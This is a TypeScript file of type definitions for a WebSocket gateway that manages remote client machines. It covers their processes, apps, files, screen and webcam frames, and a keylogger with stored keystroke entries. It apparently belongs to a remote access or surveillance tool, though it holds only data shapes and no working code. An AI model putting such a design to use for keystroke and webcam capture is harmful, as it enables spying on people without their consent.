// Types for the Gateway WebSocket system

export interface Backend {
  id: number;
  hostname: string;
  os: string;
  status: 'online' | 'offline';
  ip: string;
  lastSeen: number;
  cpu?: number;
  memory?: number;
}

export interface Process {
  pid: number;
  name: string;
  user: string;
  cmd: string;
  cpu?: number;
  memory?: number;
  status?: 'Running' | 'Sleeping' | 'Stopped';
}

export interface AppInfo {
  id: string;
  name: string;
  icon: string;
  exec: string;
  keywords?: string;
}

export interface FileEntry {
  name: string;
  type: 'file' | 'folder';
  path: string;
  size?: number;
  extension?: string;
}

export interface ClientState {
  monitor: 'idle' | 'starting' | 'active' | 'stopping';
  webcam: 'idle' | 'starting' | 'active' | 'stopping';
  keylogger: 'idle' | 'starting' | 'active' | 'stopping';
}

export interface KeylogEntry {
  text: string;
  timestamp: number;
}

export interface Client extends Backend {
  // Persistent data
  keylogs: KeylogEntry[];
  logs: string[];
  processes: Process[];
  apps: AppInfo[];
  files: FileEntry[];
  currentPath: string;
  // Feature states
  state: ClientState;
  // Video frames (blob URLs)
  monitorFrame?: string;
  webcamFrame?: string;
}

export type ConnectionStatus = 'DISCONNECTED' | 'CONNECTING' | 'CONNECTED';

export type BackendFrameEvent =
  | { kind: 'jpeg'; backendId: number; payload: ArrayBuffer }
  | { kind: 'text'; backendId: number; text: string }
  | { kind: 'binary'; backendId: number; payload: ArrayBuffer };
